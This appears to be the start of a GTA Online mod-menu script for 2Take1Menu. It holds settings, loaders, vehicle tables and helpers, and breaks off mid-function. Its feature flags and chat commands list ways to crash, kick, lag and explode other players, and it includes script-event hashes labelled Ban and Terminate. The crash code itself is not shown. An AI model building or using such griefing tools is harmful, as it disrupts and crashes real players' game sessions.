_2t1s_loader = true
local a = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\2Take1Script"
local function b()
    local c = debug.getinfo(2, "S")
    local d = c.source:sub(2) or c
    while string.find(d, "\\", 1) ~= nil do
        d = string.sub(d, 2)
    end
    d = string.sub(d, 1, -5)
    return d
end
_2t1s_name = b()
local e = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts"
if _2t1s_loader ~= true then
    local f = io.open(e .. "\\XXloadscriptXX.lua", "w")
    io.output(f)
    io.write("if _2t1s_loader then\n")
    io.write('	ui.notify_above_map("Already loaded!", "2Take1Script", 208)\n')
    io.write("	return\n")
    io.write("end\n")
    io.write("_2t1s_loader = true\n")
    io.write("if not require(_2t1s_name) then\n")
    io.write('    ui.notify_above_map("ERROR Loading Script ".._2t1s_name.."!", "2Take1Script", 208)\n')
    io.write("end\n")
    io.write('local menu_wait = menu.add_feature("", "toggle", 0, function (f)\n')
    io.write("    while true do\n")
    io.write("       system.wait(333) \n")
    io.write("		if _2t1s_reload then\n")
    io.write('			ui.notify_above_map("Unload detected!", "2Take1Script", 208)\n')
    io.write("			_2t1s_reload = false\n")
    io.write("		end\n")
    io.write("    end\n")
    io.write("    end)\n")
    io.write("    menu_wait.hidden = true\n")
    io.write("    menu_wait.on = true\n")
    io.write("\n")
    io.close(f)
    if not require("XXloadscriptXX") then
        ui.notify_above_map("ERROR Loading Script " .. _2t1s_name .. "!", "2Take1Script", 208)
    end
    return
end
local g = {}
local h = {}
g[1] = "version"
h[g[1]] = 11
g[2] = "2t1s_p"
h[g[2]] = true
g[3] = "exclude_fr"
h[g[3]] = true
g[4] = "logger"
h[g[4]] = true
g[5] = "placeholder"
h[g[5]] = nil
g[6] = "placeholder"
h[g[6]] = nil
g[7] = "bl_hidden"
h[g[7]] = false
g[8] = "blacklist_enabled"
h[g[8]] = false
g[9] = "auto_kick"
h[g[9]] = false
g[10] = "mark_modder"
h[g[10]] = false
g[11] = "admin_enabled"
h[g[11]] = false
g[12] = "kick_joining"
h[g[12]] = false
g[13] = "placeholder"
h[g[13]] = nil
g[14] = "modder_hidden"
h[g[14]] = false
g[15] = "remember_modder"
h[g[15]] = false
g[16] = "speed_bypass"
h[g[16]] = false
g[17] = "name_bypass"
h[g[17]] = false
g[18] = "modded_ip_scid"
h[g[18]] = false
g[19] = "modded_net_events"
h[g[19]] = false
g[20] = "placeholder"
h[g[20]] = nil
g[21] = "placeholder"
h[g[21]] = nil
g[22] = "lobby_hidden"
h[g[22]] = false
g[23] = "veh_blacklist"
h[g[23]] = false
g[24] = "Oppressor"
h[g[24]] = false
g[25] = "MK2_Oppressor"
h[g[25]] = false
g[26] = "Lazer"
h[g[26]] = false
g[27] = "Hydra"
h[g[27]] = false
g[28] = "Deluxo"
h[g[28]] = false
g[29] = "Akula"
h[g[29]] = false
g[30] = "B_11_Strikforce"
h[g[30]] = false
g[31] = "Tank"
h[g[31]] = false
g[32] = "Khanjali"
h[g[32]] = false
g[33] = "Stromberg"
h[g[33]] = false
g[34] = "Buzzard"
h[g[34]] = false
g[35] = "Hunter"
h[g[35]] = false
g[36] = "Avenger"
h[g[36]] = false
g[37] = "Insurgent_Pickup"
h[g[37]] = false
g[38] = "Insurgent_Pickup_Custom"
h[g[38]] = false
g[39] = "Halftrack"
h[g[39]] = false
g[40] = "placeholder"
h[g[40]] = nil
g[41] = "teleport_to_block"
h[g[41]] = false
g[42] = "explode_lobby"
h[g[42]] = false
g[43] = "explode_lobby_value"
h[g[43]] = 8
g[44] = "explode_lobby_shake"
h[g[44]] = false
g[45] = "sound_rape"
h[g[45]] = false
g[46] = "kill_all_peds"
h[g[46]] = false
g[47] = "disablecontrol"
h[g[47]] = false
g[48] = "bounty_after_death"
h[g[48]] = false
g[49] = "bounty_after_death_value"
h[g[49]] = 0
g[50] = "anonymous_bounty"
h[g[50]] = false
g[51] = "karma_se"
h[g[51]] = false
g[52] = "placeholder"
h[g[52]] = nil
g[53] = "placeholder"
h[g[53]] = nil
g[54] = "punish_aliens"
h[g[54]] = false
g[55] = "placeholder"
h[g[55]] = nil
g[56] = "force_host"
h[g[56]] = false
g[57] = "placeholder"
h[g[57]] = nil
g[58] = "placeholder"
h[g[58]] = nil
g[59] = "chat_hidden"
h[g[59]] = false
g[60] = "chat_cmd_friends"
h[g[60]] = true
g[61] = "chat_cmd_all"
h[g[61]] = false
g[62] = "chat_log"
h[g[62]] = false
g[63] = "chat_russki"
h[g[63]] = false
g[64] = "chat_begger"
h[g[64]] = false
g[65] = "placeholder"
h[g[65]] = nil
g[66] = "chat_cmd"
h[g[66]] = false
g[67] = "cmd_explode"
h[g[67]] = false
g[68] = "cmd_explode_all"
h[g[68]] = false
g[69] = "cmd_kick"
h[g[69]] = false
g[70] = "cmd_kick_all"
h[g[70]] = false
g[71] = "cmd_crash"
h[g[71]] = false
g[72] = "cmd_crash_all"
h[g[72]] = false
g[73] = "cmd_lag"
h[g[73]] = false
g[74] = "cmd_trap"
h[g[74]] = false
g[75] = "cmd_tp"
h[g[75]] = false
g[76] = "cmd_clearwanted"
h[g[76]] = false
g[77] = "cmd_vehicle"
h[g[77]] = false
g[78] = "cmd_bigpp"
h[g[78]] = false
g[79] = "cmd_bigppall"
h[g[79]] = false
g[80] = "placeholder"
h[g[80]] = nil
g[81] = "placeholder"
h[g[81]] = nil
g[82] = "explosive_beam_hidden"
h[g[82]] = false
g[83] = "exp_beam"
h[g[83]] = false
g[84] = "exp_beam_type"
h[g[84]] = 59
g[85] = "exp_beam_type_2"
h[g[85]] = 8
g[86] = "exp_beam_radius"
h[g[86]] = 10
g[87] = "exp_beam_min"
h[g[87]] = 75
g[88] = "exp_beam_max"
h[g[88]] = 225
g[89] = "animal_changer_hidden"
h[g[89]] = false
g[90] = "bl_mdl_change"
h[g[90]] = true
g[91] = "ptfx_hidden"
h[g[91]] = false
g[92] = "sparkling_ass"
h[g[92]] = false
g[93] = "sparkling_tires"
h[g[93]] = false
g[94] = "smoke_area"
h[g[94]] = false
g[95] = "fire_circle"
h[g[95]] = false
g[96] = "fire_fart"
h[g[96]] = 8
g[97] = "fire_ass"
h[g[97]] = false
g[98] = "placeholder"
h[g[98]] = nil
g[99] = "placeholder"
h[g[99]] = nil
g[100] = "misc_hidden"
h[g[100]] = false
g[101] = "load_weapons"
h[g[101]] = false
g[102] = "flamethrower_scale"
h[g[102]] = 1
g[103] = "flamethrower"
h[g[103]] = false
g[104] = "flamethrower_green"
h[g[104]] = false
g[105] = "shoot_entitys"
h[g[105]] = false
g[106] = "Boat"
h[g[106]] = false
g[107] = "Bumper_Car"
h[g[107]] = false
g[108] = "XMAS_Tree"
h[g[108]] = false
g[109] = "Orange_Ball"
h[g[109]] = false
g[110] = "Stone"
h[g[110]] = false
g[111] = "Money_Bag"
h[g[111]] = false
g[112] = "Cash_Pile"
h[g[112]] = false
g[113] = "Trash"
h[g[113]] = false
g[114] = "Roller_Car"
h[g[114]] = false
g[115] = "Cable_Car"
h[g[115]] = false
g[116] = "Big_Dildo"
h[g[116]] = false
g[117] = "delete_gun"
h[g[117]] = false
g[118] = "model_gun"
h[g[118]] = false
g[119] = "model_gun_ext"
h[g[119]] = false
g[120] = "placeholder"
h[g[120]] = nil
g[121] = "placeholder"
h[g[121]] = nil
g[122] = "veh_lights_speed"
h[g[122]] = 125
g[123] = "random_primary"
h[g[123]] = false
g[124] = "random_secondary"
h[g[124]] = false
g[125] = "random_pearlescent"
h[g[125]] = false
g[126] = "random_neon"
h[g[126]] = false
g[127] = "random_smoke"
h[g[127]] = false
g[128] = "random_xenon"
h[g[128]] = false
g[129] = "rainbow_primary"
h[g[129]] = false
g[130] = "rainbow_secondary"
h[g[130]] = false
g[131] = "rainbow_pearlescent"
h[g[131]] = false
g[132] = "rainbow_neon"
h[g[132]] = false
g[133] = "rainbow_smoke"
h[g[133]] = false
g[134] = "rainbow_xenon"
h[g[134]] = false
g[135] = "synced_random"
h[g[135]] = false
g[136] = "synced_rainbow"
h[g[136]] = false
g[137] = "synced_rainbow_smooth"
h[g[137]] = false
g[138] = "placeholder"
h[g[138]] = nil
g[139] = "black_100"
h[g[139]] = false
g[140] = "fade_black_red"
h[g[140]] = false
g[141] = "placeholder"
h[g[141]] = nil
g[142] = "placeholder"
h[g[142]] = nil
g[143] = "heli"
h[g[143]] = false
g[144] = "heli_i"
h[g[144]] = 100
g[145] = "sel_boost_speed"
h[g[145]] = false
g[146] = "sel_boost_speed_speed"
h[g[146]] = 100
g[147] = "speedometer"
h[g[147]] = false
g[148] = "speedometer_type"
h[g[148]] = 1
g[149] = "placeholder"
h[g[149]] = nil
g[150] = "drive_on_ocean"
h[g[150]] = false
g[151] = "drive_this_height"
h[g[151]] = false
g[152] = "weird_ent"
h[g[152]] = false
g[153] = "real_time"
h[g[153]] = false
g[154] = "random_clothes"
h[g[154]] = false
g[155] = "clear_area"
h[g[155]] = false
g[156] = "placeholder"
h[g[156]] = false
g[157] = "auto_tp_wp"
h[g[157]] = false
g[158] = "police_outfit"
h[g[158]] = false
g[159] = "placeholder"
h[g[159]] = nil
g[160] = "placeholder"
h[g[160]] = nil
g[161] = "auto_load"
h[g[161]] = false
g[162] = "placeholder"
h[g[162]] = nil
g[163] = "placeholder"
h[g[163]] = nil
g[164] = "bodyguards_hidden"
h[g[164]] = false
g[165] = "bodyguards_god"
h[g[165]] = false
g[166] = "bodyguards_health"
h[g[166]] = 5000
g[167] = "bodyguards_equip_weapon"
h[g[167]] = false
g[168] = "bodyguards_formation_type"
h[g[168]] = 0
g[169] = "placeholder"
h[g[169]] = nil
g[170] = "options_hidden"
h[g[170]] = false
g[171] = "custom_vehicles_hidden"
h[g[171]] = false
g[172] = "spawn_in_vehicle"
h[g[172]] = true
g[173] = "use_own_veh"
h[g[173]] = true
g[174] = "set_godmode"
h[g[174]] = false
g[175] = "attach_no_colision"
h[g[175]] = false
g[176] = "continuously_assassins"
h[g[176]] = false
g[177] = "override_notify_color"
h[g[177]] = false
g[178] = "notify_color"
h[g[178]] = 0
g[179] = "enable_aim_prot"
h[g[179]] = false
g[180] = "anonymous_punishment"
h[g[180]] = true
g[181] = "aim_prot_ragdoll"
h[g[181]] = false
g[182] = "aim_prot_fire"
h[g[182]] = false
g[183] = "aim_prot_kill"
h[g[183]] = false
g[184] = "aim_prot_remove_weapon"
h[g[184]] = false
g[185] = "aim_prot_kick"
h[g[185]] = false
g[186] = "enable_hotkeys"
h[g[186]] = false
g[187] = "hotkey_notification"
h[g[187]] = false
local i = {}
local j = {}
i[1] = "leave_session"
j[i[1]] = nil
i[2] = "crash_yourself"
j[i[2]] = nil
i[3] = "print_info_from_entity"
j[i[3]] = nil
i[4] = "send_message_to_dc"
j[i[4]] = nil
i[5] = "drive_this_height"
j[i[5]] = nil
i[6] = "auto_tp_wp"
j[i[6]] = nil
i[7] = "force_host"
j[i[7]] = nil
i[8] = "synced_rainbow"
j[i[8]] = nil
i[9] = "veh_blacklist"
j[i[9]] = nil
i[10] = "laser_beam_explode_waypoint"
j[i[10]] = nil
i[11] = "blacklist_enabled"
j[i[11]] = nil
i[12] = "kick_joining"
j[i[12]] = nil
i[13] = "remember_modder"
j[i[13]] = nil
i[14] = "exclude_fr"
j[i[14]] = nil
i[15] = "chat_cmd"
j[i[15]] = nil
i[16] = "send_msg_to_script_users"
j[i[16]] = nil
i[17] = "teleport_high_in_air"
j[i[17]] = nil
i[18] = "tp_own_veh_to_me"
j[i[18]] = nil
i[19] = "tp_own_veh_to_me_drive"
j[i[19]] = nil
i[20] = "drive_own_veh"
j[i[20]] = nil
i[21] = "tp_to_own_veh"
j[i[21]] = nil
i[22] = "save_config"
j[i[22]] = nil
local function k(l, m)
    if m == nil then
        m = 140
    end
    if h["override_notify_color"] then
        m = h["notify_color"]
    end
    ui.notify_above_map(l, "2Take1Script", m)
end
local function n(o, m)
    if h["logger"] then
        local f = io.open(a .. "\\2Take1Script.log", "a")
        local l = os.date("*t")
        if l.month < 10 then
            l.month = "0" .. l.month
        end
        if l.day < 10 then
            l.day = "0" .. l.day
        end
        if l.hour < 10 then
            l.hour = "0" .. l.hour
        end
        if l.min < 10 then
            l.min = "0" .. l.min
        end
        if l.sec < 10 then
            l.sec = "0" .. l.sec
        end
        local p =
            "[" ..
            l.year ..
                "-" .. l.month .. "-" .. l.day .. " " .. l.hour .. ":" .. l.min .. ":" .. l.sec .. "] [2Take1Script] "
        if m ~= nil then
            p = p .. m .. " "
        end
        io.output(f)
        io.write(p .. o .. "\n")
        io.close(f)
    end
end
if _2t1s then
    n("2Take1Script already loaded, stopping.")
    k("2Take1Script already loaded, stopping.", 208)
    return
end
local q = {
    {"Severe Weather", {0}},
    {"Half Track", {0, 1}},
    {"Night Shark AAT", {0, 2}},
    {"APC Mission", {0, 3}},
    {"MOC Mission", {0, 4}},
    {"Tampa Mission", {0, 5}},
    {"Opressor Mission 1", {0, 6}},
    {"Opressor Mission 2", {0, 7}}
}
local r = {
    {"Ban", 0xec7e01b9, {0, 1, 5, 0}, 0x96308401, {0, 1, 5, 0}},
    {"Dismiss", 0x96308401, {0, 1, 5}, 0x96308401, {0, 1, 5}},
    {"Terminate", 0x96308401, {1, 1, 6}, 0x96308401, {0, 1, 6, 0}}
}
if utils.dir_exists(a) then
    if utils.file_exists(a .. "\\2Take1ScriptEXT.lua") then
        _2t1sEXT = true
        if require("\\2Take1Script\\2Take1ScriptEXT") then
            n("2Take1ScriptEXT successfully loaded.")
        else
            _2t1sEXT = false
            k("ERROR Loading Script, returning!", 208)
            return
        end
    else
        k("2Take1ScriptEXT.lua not found!\nMake sure you have all important files!", 208)
        return
    end
else
    k("2Take1Script folder not found, creating...", 208)
    if utils.make_dir(a) then
        k(
            "Folder created, still missing files!\nMake sure you placed the files in the folder and reload the script!",
            208
        )
    else
        k("Creating folder failed!\nRedownload the script and make sure you got all files!", 208)
    end
    return
end
if utils.file_exists(os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\2Take1Script-Admin.lua") then
    if not l_a then
        if require("2Take1Script-Admin") then
            n("NO ERROR!")
        end
    end
end
if menu.is_threading_mode(0) then
    k("The Menu is in wrong threading mode. Change it to 'Fiber' in Menu Settings.", 27)
    return
end
local s = {
    {"Boat", -1685705098, false},
    {"Bumper_Car", -77393630, false},
    {"XMAS_Tree", 238789712, false},
    {"Orange_Ball", 148511758, false},
    {"Stone", 2042668880, false},
    {"Money_Bag", 289396019, false},
    {"Cash_Pile", -295781225, false},
    {"Trash", 1919238784, false},
    {"Roller_Car", 1543894721, false},
    {"Cable_Car", -733833763, false},
    {"Big_Dildo", 1333481871, false}
}
local t = {
    {222, 222, 255},
    {2, 21, 255},
    {3, 83, 255},
    {0, 255, 140},
    {94, 255, 1},
    {255, 255, 0},
    {255, 150, 5},
    {255, 62, 0},
    {255, 1, 1},
    {255, 50, 100},
    {255, 5, 190},
    {35, 1, 255},
    {15, 3, 255}
}
local u = _2t1s_ped_assassins
local v = {
    {"Oppressor", 0x34B82784},
    {"MK2_Oppressor", 0x7B54A9D3},
    {"Lazer", 0xB39B0AE6},
    {"Hydra", 0x39D6E83F},
    {"Deluxo", 0x586765FB},
    {"Akula", 0x46699F47},
    {"B_11_Strikforce", 0x64DE07A1},
    {"Tank", 0x2EA68690},
    {"Khanjali", 0xAA6F980A},
    {"Stromberg", 0x34DBA661},
    {"Buzzard", 0x2F03547B},
    {"Hunter", 0xFD707EDE},
    {"Avenger", 0x81BD2ED0},
    {"Insurgent_Pickup", 0x9114EADA},
    {"Insurgent_Pickup_Custom", 0x8D4B7A8A},
    {"Halftrack", 0xFE141DA6}
}
local w = {
    {"cmd_explode", "!explode <playername>"},
    {"cmd_explode_all", "!explodeall	[SU]"},
    {"cmd_kick", "!kick <playername>"},
    {"cmd_kick_all", "!kickall	[SU]"},
    {"cmd_crash", "!crash <playername>	[SU]"},
    {"cmd_crash_all", "!crashall	[SU]"},
    {"cmd_lag", "!lag <playername>"},
    {"cmd_trap", "!trap <playername>"},
    {"cmd_tp", "!tp <playername>	[SU]"},
    {"cmd_clearwanted", "!clearwanted	[NOT SU]"},
    {"cmd_vehicle", "!vehicle <NAME>"},
    {"cmd_bigpp", "!bigpp <playername>"},
    {"cmd_bigppall", "!bigppall	[SU]"}
}
local x = _2t1s_russki_chars
local y = _2t1s_begger_texts
if not utils.file_exists(a .. "\\2Take1Script.png") then
    k("ERROR Loading Script, returning!", 208)
    k("Missing files! Redownload the .zip folder and make sure you have all included files!!!")
    return
end
local z = {}
local A = {
    {
        "Main LSC",
        {
            {3291218330, {-357.45132446289, -134.30920410156, 38.53914642334}, {0, 0, -20}, true, true},
            {false, {-370.4, -104.72, 47}, -110.83449554443}
        }
    },
    {
        "La Mesa LSC",
        {
            {3291218330, {722.9853515625, -1089.2061767578, 23.043445587158}, {0, 0, 0}, true, true},
            {false, {700, -1085, 24}, -100}
        }
    },
    {
        "LSIA LSC",
        {
            {3291218330, {-1145.7882080078, -1991.130859375, 13.163989067078}, {0, 0, 45}, true, true},
            {false, {-1117.1, -1983.3, 23}, 104.5}
        }
    },
    {
        "Desert LSC",
        {
            {3291218330, {1178.552734375, 2646.4377441406, 37.874099731445}, {0, 0, 90}, true, true},
            {false, {1182, 2673.2, 39}, 163.3}
        }
    },
    {
        "Paleto Bay LSC",
        {
            {3291218330, {112.54597473145, 6619.6850585938, 31.604303359985}, {0, 0, -45}, true, true},
            {false, {140.8, 6601.9, 32}, 57}
        }
    },
    {
        "Bennys LSC",
        {
            {3291218330, {-208.5591583252, -1308.7404785156, 31.718006134033}, {0, 0, 90}, true, true},
            {false, {-184.2, -1292.5, 34}, 124.3}
        }
    }
}
local B = {
    {
        "Entrance",
        {
            {3291218330, {924.69201660156, 62.243091583252, 81.21053314209}, {0, 0, 80}, true, true},
            {3291218330, {910.31787109375, 36.022556304932, 80.59684753418}, {0, 0, 25}, true, true},
            {false, {920.8, 80.5, 80}, -177}
        }
    },
    {
        "Garage",
        {
            {3291218330, {932.78601074219, -2.0857257843018, 80.166107177734}, {0, 0, 60}, true, true},
            {false, {940, -21, 80}, 4.9}
        }
    },
    {
        "Roof",
        {
            {3291218330, {964.02569580078, 58.947933197021, 113.34354400635}, {0, 0, -30}, true, true},
            {false, {954.8, 63.34, 114}, -124.2}
        }
    }
}
local C = {
    {
        "Entrance",
        {
            {3291218330, {-81.541351318359, -792.25347900391, 44.622947692871}, {0, 0, 100}, true, true},
            {3291218330, {-70.231819152832, -802.17694091797, 44.230716705322}, {0, 0, 0}, true, true},
            {false, {-55.1, -776.5, 46}, 125.4}
        }
    },
    {
        "Garage",
        {
            {3291218330, {-83.269706726074, -773.02490234375, 39.806701660156}, {0, -35, 105}, true, true},
            {false, {-86.2, -762.2, 44}, -165.7}
        }
    },
    {
        "Roof",
        {
            {3291218330, {-66.390617370605, -813.32702636719, 320.40509033203}, {0, 0, 60}, true, true},
            {3291218330, {-66.451454162598, -822.87298583984, 321.19717407227}, {0, 0, 100}, true, true},
            {3291218330, {-68.104598999023, -818.67510986328, 323.35980224609}, {0, 90, 0}, true, true},
            {false, {-76.6, -817.6, 328}}
        }
    },
    {
        "Arena War",
        {
            {3291218330, {-371.32809448242, -1859.2064208984, 21.246929168701}, {0, 15, -75}, true, true},
            {3291218330, {-396.87942504883, -1869.1518554688, 22.718107223511}, {0, 15, -60}, true, true},
            {false, {-379.6, -1850, 23}, -166.6}
        }
    }
}
local D = io.open(a .. "\\2Take1Script.png", "r")
if D ~= nil then
    local E = 1
    for F in io.lines(a .. "\\2Take1Script.png") do
        if E >= 2 then
            z[#z + 1] = F
        end
        E = E + 1
    end
    io.close(D)
end
local G = _2t1s_se_custom
local H = _2t1s_block_custom
local I = _2t1s_custom_attachments
local J = _2t1s_custom_vehicles
local K = _2t1s_vehicle_lag_area
local L = _2t1s_modded_ips
local M = _2t1s_modded_scids
local N = _2t1s_speedometer_units
local O = _2t1s_bounty_amount
local P = _2t1s_sms_texts
local Q = {1057201338, 2238511874, 762327283}
local R = {
    62409944,
    64074298,
    155527062,
    153219155,
    131037988,
    141884823,
    104432921,
    147111499,
    9284553,
    114982881,
    137663665,
    63457,
    137601710,
    138075198,
    123017343,
    130291511,
    137851207,
    137714280,
    127448079,
    137579070,
    134412628,
    133709045,
    64234321,
    131973478,
    103019313,
    103054099,
    104041189,
    110470958,
    119266383,
    119958356,
    121397532,
    121698158,
    123849404,
    121943600,
    129159629,
    18965281,
    216820,
    56778561,
    99453545,
    99453882,
    88435916,
    174875493
}
local S = _2t1s_weapons
local T = {
    ["bl_objects"] = {},
    ["peds"] = {},
    ["attach_obj"] = {},
    ["asteroids"] = {},
    ["lag_area"] = {},
    ["custom_veh"] = {},
    ["preview_veh"] = {},
    ["temp_veh"] = {},
    ["shooting"] = {},
    ["chat_veh"] = {},
    ["bodyguards"] = {},
    ["bodyguards_veh"] = {}
}
local U = {["parent"] = 0, ["opl_parent"] = 0}
local V = {}
local D = io.open(a .. "\\2Take1Script.ini", "r")
if D ~= nil then
    n("Loading Settings from file...")
    local E = 1
    for F in io.lines(a .. "\\2Take1Script.ini") do
        F = string.gsub(F, g[E] .. "=", "")
        if E == 1 then
            if tonumber(F) ~= h["version"] then
                k("You got an old settings file, unfortunately i cant read it :(\nPlease save settings first.", 130)
                n("Old settings file detected, stopping reading it.")
                break
            end
        else
            if F == "true" then
                h[g[E]] = true
            elseif F == "false" then
                h[g[E]] = false
            elseif F ~= "nil" then
                h[g[E]] = tonumber(F)
            end
        end
        E = E + 1
    end
    io.close(D)
end
local function W()
    local D = io.open(a .. "\\2Take1Hotkeys.ini", "r")
    if D ~= nil then
        local E = 1
        for F in io.lines(a .. "\\2Take1Hotkeys.ini") do
            if E == 1 then
                F = string.gsub(F, "version=", "")
                if tonumber(F) ~= h["version"] then
                    k("You got an old Hotkeys.ini file, unfortunately i cant read it :(\nPlease delete the file!", 130)
                    n("Old Hotkeys.ini file detected, stopping reading it.")
                    break
                end
            elseif E <= #i + 1 then
                F = string.gsub(F, i[E - 1] .. "=", "")
                if F ~= "nil" then
                    j[i[E - 1]] = F
                end
            end
            E = E + 1
        end
        io.close(D)
        n("Readed Hotkeys.")
    end
end
W()
local X = {{0, 0}, {0, 6}, {0, 14}, {0, 34}, {0, 0}, {0, 25}, {0, 0}, {0, 35}, {0, 0}, {0, 0}, {0, 48}}
local Y = {{0, 45, 0}, {1, 11, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
local Z = {{0, 0}, {0, 0}, {0, 0}, {0, 35}, {0, 0}, {0, 25}, {0, 0}, {0, 58}, {0, 0}, {0, 0}, {0, 55}}
local _ = {{0, 46, 0}, {1, 13, 0}, {2, 4294967295, 0}, {6, 4294967295, -1}, {7, 4294967295, -1}}
local a0 = {"random_primary", "random_secondary", "random_pearlescent", "random_neon", "random_smoke", "random_xenon"}
local a1 = {
    "rainbow_primary",
    "rainbow_secondary",
    "rainbow_pearlescent",
    "rainbow_neon",
    "rainbow_smoke",
    "rainbow_xenon"
}
local a2 = {"synced_rainbow", "synced_random", "synced_rainbow_smooth"}
local a3, a4, a5 = 0, false, 0
local a6 = v3()
local a7, a8, a9, aa = nil, {}, {}, false
local ab, ac = {}, {}
local ad = {}
local ae = {}
local af, ag
local ah
local aj = nil
local ak
local al = {}
local am, an, ao
local ap
local aq
local ar, as
local at = {}
local au = {}
local av = {
    ["flamethrower"] = nil,
    ["flamethrower_green"] = nil,
    ["alien"] = nil,
    ["fire_circle"] = {},
    ["fire_balls"] = {},
    ["fire_ass"] = nil,
    ["fire_ass_ball"] = nil
}
local aw = {
    ["maxspeed"] = nil,
    ["illegalname"] = nil,
    ["moddedip"] = nil,
    ["moddedscid"] = nil,
    ["moddednetevent"] = nil
}
local ax = {
    65536,
    131072,
    262144,
    524288,
    1048576,
    2097152,
    4194304,
    8388608,
    16777216,
    33554432,
    67108864,
    134217728,
    268435456
}
n("Loading Modder-Flags...")
for E = 1, #ax do
    if player.get_modder_flag_text(ax[E]) == "Max-Speed-Bypass" then
        aw["maxspeed"] = ax[E]
    end
    if player.get_modder_flag_text(ax[E]) == "Illegal-Name" then
        aw["illegalname"] = ax[E]
    end
    if player.get_modder_flag_text(ax[E]) == "Modded-IP" then
        aw["moddedip"] = ax[E]
    end
    if player.get_modder_flag_text(ax[E]) == "Modded-SCID" then
        aw["moddedscid"] = ax[E]
    end
    if player.get_modder_flag_text(ax[E]) == "Modded-Net-Event" then
        aw["moddednetevent"] = ax[E]
    end
    if player.get_modder_flag_text(ax[E]) == "" then
        break
    end
end
if aw["maxspeed"] == nil then
    aw["maxspeed"] = player.add_modder_flag("Max-Speed-Bypass")
end
if aw["illegalname"] == nil then
    aw["illegalname"] = player.add_modder_flag("Illegal-Name")
end
if aw["moddedip"] == nil then
    aw["moddedip"] = player.add_modder_flag("Modded-IP")
end
if aw["moddedscid"] == nil then
    aw["moddedscid"] = player.add_modder_flag("Modded-SCID")
end
if aw["moddednetevent"] == nil then
    aw["moddednetevent"] = player.add_modder_flag("Modded-Net-Event")
end
local ay = enable_rockstar_admin_kick_crash
math.randomseed(utils.time_ms())
local function az(E)
    if player.is_player_valid(E) then
        return player.get_player_name(E)
    end
    return "Invalid Player"
end
local function aA(E)
    if player.is_player_valid(E) then
        local aB = player.get_player_scid(E)
        if aB ~= 4294967295 then
            return aB
        end
    end
    return -1
end
local function aC(aD, aE, m)
    return menu.add_feature(aD, "parent", aE, m)
end
local function aF(aD, aE, m)
    return menu.add_feature(aD, "action", aE, m)
end
local function aG(aD, aE, m)
    return menu.add_feature(aD, "toggle", aE, m)
end
local function aH(aD, aI, aE, m)
    return menu.add_feature(aD, aI, aE, m)
end
local function aJ(aD, aE, m)
    return menu.add_player_feature(aD, "parent", aE, m)
end
local function aK(aD, aE, m)
    return menu.add_player_feature(aD, "action", aE, m)
end
local function aL(aD, aE, m)
    return menu.add_player_feature(aD, "toggle", aE, m)
end
local function aM(aD, aI, aE, m)
    return menu.add_player_feature(aD, aI, aE, m)
end
local function aN(aO)
    if aO.on then
        return HANDLER_CONTINUE
    end
    return HANDLER_POP
end
local function aP(aQ, l)
    if not network.has_control_of_entity(aQ) then
        network.request_control_of_entity(aQ)
        if l == nil then
            l = 25
        end
        local time = utils.time_ms() + l
        while not network.has_control_of_entity(aQ) and entity.is_an_entity(aQ) do
            system.yield(0)
            network.request_control_of_entity(aQ)
            if time < utils.time_ms() then
                return false
            end
        end
    end
    return true
end
local function aR(aS)
    if aS ~= nil and not streaming.has_model_loaded(aS) then
        streaming.request_model(aS)
        local time = utils.time_ms() + 2500
        while not streaming.has_model_loaded(aS) do
            system.yield(0)
            if time < utils.time_ms() then
                return false
            end
        end
    end
    return true
end
local aT = streaming.set_model_as_no_longer_needed
local aU = script.trigger_script_event
local aV = player.player_id
local aW = player.get_player_ped
local function aX()
    return aW(aV())
end
local function aY()
    return player.get_player_heading(aV())
end
local aZ = entity.get_entity_coords
local function a_()
    return aZ(aX())
end
local function b0(E, a)
    aP(E)
    entity.set_entity_velocity(E, v3())
    entity.set_entity_coords_no_offset(E, a)
end
local function b1(b2)
    if b2 ~= nil and b2[1] ~= nil then
        n("Starting Clean Up.")
        for E = 1, #b2 do
            if b2[E] ~= aX() and b2[E] ~= ped.get_vehicle_ped_is_using(aX()) then
                aP(b2[E], 5)
                entity.detach_entity(b2[E])
                entity.set_entity_velocity(b2[E], v3())
                b0(b2[E], v3(8000, 8000, -1000))
                entity.delete_entity(b2[E])
            end
        end
        n("Done.")
    end
end
event.add_event_listener(
    "exit",
    function()
        n("")
        n("2Take1Script got unloaded.")
        n("Cleaning up...")
        k("2Take1Script got unloaded.\nUnloading Script.. :(", 200)
        os.remove(e .. "\\XXloadscriptXX.lua")
        for E in pairs(T) do
            b1(T[E])
        end
        b1({ar})
        b1({ap})
        if av["flamethrower"] ~= nil then
            graphics.remove_particle_fx(av["flamethrower"], true)
        end
        if av["flamethrower_green"] ~= nil then
            graphics.remove_particle_fx(av["flamethrower_green"], true)
        end
        if av["fire_circle"][1] ~= nil then
            for E = 1, #av["fire_circle"] do
                graphics.remove_particle_fx(av["fire_circle"][E], true)
            end
            av["fire_circle"] = {}
            b1(av["fire_balls"])
            av["fire_balls"] = {}
        end
        if av["fire_ass"] ~= nil then
            graphics.remove_particle_fx(av["fire_ass"], true)
        end
        b1({av["fire_ass_ball"]})
        n("Going to remove Chat-Listeners...")
        for E in pairs(ae) do
            event.remove_event_listener("chat", ae[E])
        end
        n("Done.")
        _2t1s = false
        _2t1sEXT = false
        _2t1s_loader = false
    end
)
local function b3(b4, b5)
    local b6, b7, b8 = 0, 0, 0
    if b4.x ~= nil and b5.x ~= nil then
        b6 = (b5.x - b4.x) ^ 2
    end
    if b4.y ~= nil and b5.y ~= nil then
        b7 = (b5.y - b4.y) ^ 2
    end
    if b4.z ~= nil and b5.z ~= nil then
        b8 = (b5.z - b4.z) ^ 2
    end
    return (b6 + b7 + b8) ^ 0.5
end
local function b9(l, ba, aS)
    n("Teleporting to Target.")
    local bb, bc, bd, be = aX()
    if type(l) == "number" then
        be = ped.get_vehicle_ped_is_using(l)
        if be ~= 0 then
            if ped.is_ped_in_any_vehicle(bb) then
                ped.clear_ped_tasks_immediately(bb)
                system.yield(10)
            end
        end
    end
    bd = ped.get_vehicle_ped_is_using(bb)
    if bd ~= 0 then
        aP(bd)
        entity.set_entity_velocity(bd, v3())
        bb = bd
    end
    if type(l) == "number" then
        bc = aZ(l)
    else
        bc = l
    end
    if ba ~= nil then
        bc.z = bc.z + ba
    end
    b0(bb, bc)
    if aS ~= nil then
        entity.set_entity_heading(bb, aS)
    end
    if be ~= nil then
